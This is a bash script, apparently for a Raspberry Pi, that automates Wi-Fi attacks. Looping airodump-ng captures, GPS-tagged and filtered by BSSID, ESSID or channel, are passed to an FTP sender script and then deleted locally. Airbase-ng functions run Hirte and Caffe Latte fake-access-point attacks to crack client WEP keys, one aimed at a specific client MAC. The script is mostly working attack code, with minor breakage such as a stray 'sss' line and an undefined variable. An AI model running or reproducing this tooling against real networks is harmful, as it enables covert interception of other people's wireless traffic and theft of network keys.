#!/usr/bin/env bash

BASEPATH="/home/pi/NetSec"
ERROR_LOG="logs/errorLog.txt"
GEN_LOG="logs/genLog.txt"
FOLDERNAME=$(date +%F-%T)

# AIRODUMP-NG PACKET SNIFF -> LOAD FROM CONFIG FILE
function load_config_scan(){
	
	source ./config.conf
	sudo airmon-ng start $IFACE >> $BASEPATH/$GEN_LOG $BASEPATH/$ERROR_LOG
	INTERFACE="${IFACE}mon"
	
	echo ">> $(date +%F-%T) >> Custom Config Packet Capture Starting..." |& tee -a $BASEPATH/$GEN_LOG
	sss
	while true; do
		mkdir $BASEPATH/captures/$FOLDERNAME >> $BASEPATH/$GEN_LOG
		echo "[*] Folder Created" >> $BASEPATH/$GEN_LOG
		
		gpio -g write 22 1
		sudo timeout -k 1 ${DURATION} airodump-ng --gpsd -w $BASEPATH/captures/$FOLDERNAME/configCapture $INTERFACE 2> /dev/null
		gpio -g write 22 0
		
		echo "[*] Capture for $foldername complete. Sending..." >> $BASEPATH/$GEN_LOG
		python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
		sudo rm -f -r $BASEPATH/captures/*
		FOLDERNAME=$(date +%F-%T)
	done
}

# AIRODUMP-NG PACKET SNIFF -> QUICK SCAN (INFINITE LOOP)
function quick_scan(){
	echo ">> $(date +%F-%T) >> Quick Packet Capture Starting..." |& tee -a $BASEPATH/$GEN_LOG
	source ./setup/config.conf
	
	while true; do
		mkdir $BASEPATH/captures/$FOLDERNAME >> $BASEPATH/$GEN_LOG
		echo "[*] Folder Created" >> $BASEPATH/$GEN_LOG
		
		gpio -g write 22 1
		sudo timeout -k 1 ${DURATION} sudo airodump-ng --gpsd -w $BASEPATH/captures/$FOLDERNAME/quickCapture $INTERFACE 2> /dev/null
		gpio -g write 22 0
		
		echo "[*] Capture for $foldername complete. Sending..." >> $BASEPATH/$GEN_LOG
		python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
		sudo rm -f -r $BASEPATH/captures/*
		FOLDERNAME=$(date +%F-%T)	
	done
}

# AIRODUMP-NG PACKET SNIFF -> SCAN BY BSSID (INFINITE LOOP)
function bssid_scan(){	
	echo ">> $(date +%F-%T) >> ${bssid} >> Custom BSSID Packet Capture Starting..." |& tee -a $BASEPATH/$GEN_LOG
	source ./setup/config.conf
	while true; do
		mkdir $BASEPATH/captures/$FOLDERNAME >> $BASEPATH/$GEN_LOG
		echo "[*] Folder Created" >> $BASEPATH/$GEN_LOG
		
		gpio -g write 22 1
		sudo timeout -k 1 ${DURATION} airodump-ng --bssid ${SCAN_TARGET} --gpsd -w $BASEPATH/captures/$FOLDERNAME/bssidCapture $INTERFACE 2> /dev/null
		gpio -g write 22 0
		
		echo "[*] Capture for $foldername complete. Sending..." >> $BASEPATH/$GEN_LOG
		python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
		sudo rm -f -r $BASEPATH/captures/*
		FOLDERNAME=$(date +%F-%T)
	done
}

# AIRODUMP-NG PACKET SNIFF -> SCAN BY ESSID (INFINITE LOOP)
function essid_scan(){
	echo ">> $(date +%F-%T) >> ${essid} >> Custom ESSID Packet Capture Starting..." |& tee -a $BASEPATH/$GEN_LOG
	source ./setup/config.conf
	
	while true; do
		mkdir $BASEPATH/captures/$FOLDERNAME >> $BASEPATH/$GEN_LOG
		echo "[*] Folder Created" >> $BASEPATH/$GEN_LOG
	
		gpio -g write 22 1
		sudo timeout -k 1 ${DURATION} airodump-ng --essid ${SCAN_TARGET} --gpsd -w $BASEPATH/captures/$FOLDERNAME/essidCapture $INTERFACE 2> /dev/null
		gpio -g write 22 0
		
		echo "[*] Capture for $foldername complete. Sending..." >> $BASEPATH/$GEN_LOG
		python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
		sudo rm -f -r $BASEPATH/captures/*
		FOLDERNAME=$(date +%F-%T)
	done
}

# AIRODUMP-NG PACKET SNIFF -> SCAN BY CHANNEL (INFINITE LOOP)
function channel_scan(){
	echo ">> $(date +%F-%T) >> ${channel} >> Custom Channel Packet Capture Starting..." |& tee -a $BASEPATH/$GEN_LOG
	source ./setup/config.conf
	
	while true; do
		mkdir $BASEPATH/captures/$FOLDERNAME >> $BASEPATH/$GEN_LOG
		echo "[*] Folder Created" >> $BASEPATH/$GEN_LOG
		
		gpio -g write 22 1
		sudo timeout -k 1 ${DURATION} airodump-ng -c ${SCAN_TARGET} --gpsd -w $BASEPATH/captures/$FOLDERNAME/channelCapture $INTERFACE 2> /dev/null
		gpio -g write 22 0
		
		echo "[*] Capture for $foldername complete. Sending..." >> $BASEPATH/$GEN_LOG
		python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
		sudo rm -f -r $BASEPATH/captures/*
		FOLDERNAME=$(date +%F-%T)
	done
}

function hirte_attack(){	
	echo ">> $(date +%F-%T) >> ${ESSID} >> Hirte Attack Starting..." |& tee -a $BASEPATH/$GEN_LOG
	
	sudo airbase-ng -c "$CHANNEL" --essid "$ESSID" -W 1 -N -F $BASEPATH/hirte $INTERFACE
	#sleep 2
	#sudo timeout -k 1 5 airodump-ng --channel $CHANNEL $INTERFACE --write $BASEPATH/hirte/capture &
	
	#mkdir $BASEPATH/hirte/$FOLDERNAME >> $BASEPATH/$GEN_LOG
	#echo "Folder Created" >> $BASEPATH/$GEN_LOG
	#python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
	#sudo rm -f -r $BASEPATH/captures/*
	#FOLDERNAME=$(date +%F-%T)
	
}

function caffe_latte_attack(){
	read -p "[*] Specify Channel: " CHANNEL
	read -p "[*] Specify Fake WEP AP Name: " ESSID
	
	echo ">> $(date +%F-%T) >> ${ESSID} >> Hirte Attack Starting..." |& tee -a $BASEPATH/$GEN_LOG
	
	sudo airbase-ng -c "$CHANNEL" --essid "$ESSID" -W 1 -L -F $BASEPATH/hirte $INTERFACE
	#sleep 2
	#sudo timeout -k 1 5 airodump-ng --channel $CHANNEL $INTERFACE --write $BASEPATH/captures/$FOLDERNAME/hirte
	
	#mkdir $BASEPATH/hirte/$FOLDERNAME >> $BASEPATH/$GEN_LOG
	#echo "Folder Created" >> $BASEPATH/$GEN_LOG
	#python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
	#sudo rm -f -r $BASEPATH/captures/*
	#FOLDERNAME=$(date +%F-%T)
}

function mac_attack(){
	read -p "[*] Specify Channel: " CHANNEL
	read -p "[*] Specify Targetted Client MAC: " MAC
	
	echo ">> $(date +%F-%T) >> ${MAC} >> Hirte Attack Starting..." |& tee -a $BASEPATH/$GEN_LOG
	
	sudo airbase-ng -c "$CHANNEL" -d "$MAC" -W 1 -N -F $BASEPATH/hirte $INTERFACE
	#sleep 2
	#sudo timeout -k 1 5 airodump-ng --channel $CHANNEL $INTERFACE --write $BASEPATH/hirte/capture &
	
	#mkdir $BASEPATH/hirte/$FOLDERNAME >> $BASEPATH/$GEN_LOG
	#echo "Folder Created" >> $BASEPATH/$GEN_LOG
	#python3 $BASEPATH/ftpSender.py >> $BASEPATH/$GEN_LOG &>> $BASEPATH/$ERROR_LOG
	#sudo rm -f -r $BASEPATH/captures/*
	#FOLDERNAME=$(date +%F-%T)
}


